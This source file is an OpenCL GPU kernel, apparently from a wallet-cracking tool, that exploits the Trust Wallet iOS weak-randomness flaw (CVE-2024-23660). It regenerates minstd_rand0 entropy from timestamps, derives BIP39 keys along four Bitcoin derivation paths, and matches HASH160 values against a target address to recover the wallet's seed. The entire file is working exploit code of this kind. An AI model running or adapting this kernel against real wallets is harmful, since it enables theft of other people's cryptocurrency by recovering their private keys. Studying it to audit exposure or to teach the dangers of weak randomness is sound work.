// Trust Wallet iOS Vulnerability (CVE-2024-23660) — LCG/minstd_rand0 GPU Scanner
//
// PRNG: std::minstd_rand0  (Park-Miller Lehmer LCG)
//   x_{n+1} = (16807 * x_n) mod (2^31 - 1)
//
// Two entropy strategies x four derivation paths = 8 combos:
//   combo 0: VariantAnd + m/44'  (P2PKH)
//   combo 1: VariantMod + m/44'  (P2PKH)
//   combo 2: VariantAnd + m/84'  (P2WPKH)
//   combo 3: VariantMod + m/84'  (P2WPKH)
//   combo 4: VariantAnd + m/49'  (P2SH-P2WPKH)
//   combo 5: VariantMod + m/49'  (P2SH-P2WPKH)
//   combo 6: VariantAnd + m/86'  (P2TR  Taproot)
//   combo 7: VariantMod + m/86'  (P2TR  Taproot)
//
// Global work size = 8 x (end_ts - start_ts).

static uint minstd_next(uint state) {
    return (uint)(((ulong)state * 16807UL) % 2147483647UL);
}

static uint minstd_seed(uint seed) {
    uint s = seed % 2147483647u;
    return (s == 0u) ? 1u : s;
}

static void lcg_entropy_and(uint seed, __private uchar entropy[16]) {
    uint s = minstd_seed(seed);
    for (int i = 0; i < 16; i++) { s = minstd_next(s); entropy[i] = (uchar)(s & 0xFFu); }
}

static void lcg_entropy_mod(uint seed, __private uchar entropy[16]) {
    uint s = minstd_seed(seed);
    for (int i = 0; i < 16; i++) { s = minstd_next(s); entropy[i] = (uchar)(s % 255u); }
}

__kernel void trust_wallet_lcg_crack(
    __global ulong* results,
    __global uint*  result_count,
    ulong  target_h160_part1,
    ulong  target_h160_part2,
    uint   target_h160_part3,
    uint   offset,
    uint   range
) {
    uint gid       = get_global_id(0);
    uint combo     = gid % 8u;
    uint ts_offset = gid / 8u;

    if (ts_offset >= range) return;

    uint timestamp = ts_offset + offset;

    uchar entropy[16];
    if ((combo & 1u) == 0u)
        lcg_entropy_and(timestamp, entropy);
    else
        lcg_entropy_mod(timestamp, entropy);

    uchar seed[64];
    bip39_entropy_to_seed_complete(entropy, seed);

    extended_private_key_t mk;
    new_master_from_seed(0, seed, &mk);

    uint purpose;
    if      (combo < 2u) purpose = 44u;
    else if (combo < 4u) purpose = 84u;
    else if (combo < 6u) purpose = 49u;
    else                 purpose = 86u;

    extended_private_key_t k_purpose, k_coin, k_account, k_change, k_addr;
    hardened_private_child_from_private(&mk,       &k_purpose, purpose);
    hardened_private_child_from_private(&k_purpose,&k_coin,    0u);
    hardened_private_child_from_private(&k_coin,   &k_account, 0u);
    normal_private_child_from_private  (&k_account,&k_change,  0u);
    normal_private_child_from_private  (&k_change, &k_addr,    0u);

    uchar hash160[20];

    if (combo >= 6u) {
        // P2TR (BIP86): tweaked x-only pubkey -> HASH160
        taproot_identifier(&k_addr, hash160);
    } else if (combo >= 4u) {
        // P2SH-P2WPKH (BIP49)
        extended_public_key_t pub;
        public_from_private(&k_addr, &pub);
        uchar inner_h160[20];
        identifier_for_public_key(&pub, inner_h160);
        uchar witness_script[22] __attribute__((aligned(4)));
        witness_script[0] = 0x00; witness_script[1] = 0x14;
        for (int i = 0; i < 20; i++) witness_script[i + 2] = inner_h160[i];
        uchar sha256_result[32] __attribute__((aligned(4)));
        sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
        ripemd160(sha256_result, 32, (__private uchar*)hash160);
    } else {
        // P2PKH (BIP44) and P2WPKH (BIP84): plain HASH160(pubkey)
        extended_public_key_t pub;
        public_from_private(&k_addr, &pub);
        identifier_for_public_key(&pub, hash160);
    }

    ulong h1 = 0UL, h2 = 0UL;
    uint  h3 = 0u;
    for (int i = 0; i < 8;  i++) h1 |= ((ulong)hash160[i])      << (i * 8);
    for (int i = 0; i < 8;  i++) h2 |= ((ulong)hash160[i + 8])  << (i * 8);
    for (int i = 0; i < 4;  i++) h3 |= ((uint) hash160[i + 16]) << (i * 8);

    if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
        uint idx = atomic_inc(result_count);
        if (idx < 1024u)
            results[idx] = (ulong)timestamp | ((ulong)combo << 32);
    }
}
